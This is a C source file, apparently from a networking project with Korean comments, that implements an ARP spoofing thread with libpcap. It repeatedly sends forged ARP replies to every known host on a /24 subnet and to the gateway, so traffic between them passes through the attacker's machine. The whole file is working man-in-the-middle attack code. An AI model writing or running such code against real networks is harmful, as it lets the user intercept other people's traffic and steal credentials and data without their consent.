#include <protocolHeader.h>
#include <srcLinkHeader.h>
#include <threadArgsHeader.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h> // usleep
#include <stdlib.h> // exit


void *arpSpoof(void *args){
    args_arpSpoof *arg = (args_arpSpoof*)args;
    arpPacket packet;

    char *dev = arg->dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcapH = pcap_open_live(dev , BUFSIZ, 1, 1000, errbuf);
    if (pcapH == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", (char *)dev, errbuf);
        exit(0);
    }

    packet.arp.op = htons(0x0002);

    uint8_t nullMac[6];
    memset(nullMac, 0x00, 6);

    while (1){
        for (int loopIp=1; loopIp <= 254; loopIp++){
            if (loopIp != arg->gatewayIp){
            // GW IP가 아닐 때,
                if (memcmp((*arg->ipTable)[loopIp], nullMac, 6) != 0) {
                // ipTable 중에서 MAC 주소가 비워져 있지 않을 때,

                    memcpy(packet.ether.shost, arg->myMac, 6);                  // ETH_SrcMAC = MY_MAC
                    memcpy(packet.ether.dhost, (*arg->ipTable)[loopIp], 6);     // ETH_DstMAC = TARGET_MAC
                    memcpy(packet.arp.sip, arg->myIp, 4);                       // ARP_SrcIP[0~2] == MY_IP[0~2]
                    packet.arp.sip[3] = arg->gatewayIp;                         // ARP_SrcIp[3] = GW_IP[3]
                    memcpy(packet.arp.sha, arg->myMac, 6);                      // ARP_SrcMAC = MY_MAC
                    memcpy(packet.arp.dip, arg->myIp, 4);                       // ARP_DstIP[0~2] == MY_IP[0~2]
                    packet.arp.dip[3] = loopIp;                                 // ARP_DstIP[3] = TARGET_IP[3]
                    memcpy(packet.arp.dha, (*arg->ipTable)[loopIp], 6);         // ARP_DstMAC = TARGET_MAC
                    if (pcap_sendpacket(pcapH, (unsigned char*)&packet, sizeof(packet)) != 0){
                        printf("Fail sendpacket 1\n");
                        exit (-1);
                    } // MY -> TARGET {[GW_IP] = [MY_MAC]}

                    //printf("ARP Spoof : %d.%d.%d.%d\n", packet.arp.dip[0], packet.arp.dip[1], packet.arp.dip[2], packet.arp.dip[3]);

                    memcpy(packet.ether.shost, (*arg->ipTable)[loopIp], 6);         // ETH_SrcMAC = TARGET_MAC
                    memcpy(packet.ether.dhost, (*arg->ipTable)[arg->gatewayIp], 6); // ETH_DstMAC = GW_MAC
                    memcpy(packet.arp.sip, arg->myIp, 4);                           // ARP_SrcIP[0~2] == MY_IP[0~2]
                    packet.arp.sip[3] = loopIp;                                     // ARP_SrcIp[3] = TARGET_IP[3]
                    memcpy(packet.arp.sha, arg->myMac, 6);                          // ARP_SrcMAC = MY_MAC
                    memcpy(packet.arp.dip, arg->myIp, 4);                           // ARP_DstIP[0~2] == MY_IP[0~2]
                    packet.arp.dip[3] = arg->gatewayIp;                             // ARP_DstIP[3] = GW_IP[3]
                    memcpy(packet.arp.dha, (*arg->ipTable)[arg->gatewayIp], 6);     // ARP_DstMAC = GW_MAC
                    if (pcap_sendpacket(pcapH, (unsigned char*)&packet, sizeof(packet)) != 0){
                        printf("Fail sendpacket 1\n");
                        exit (-1);
                    } // TARGET -> GW {[TARGET_IP] = [MY_MAC]}
                }
            }


        }

        sleep(3);
    }

}
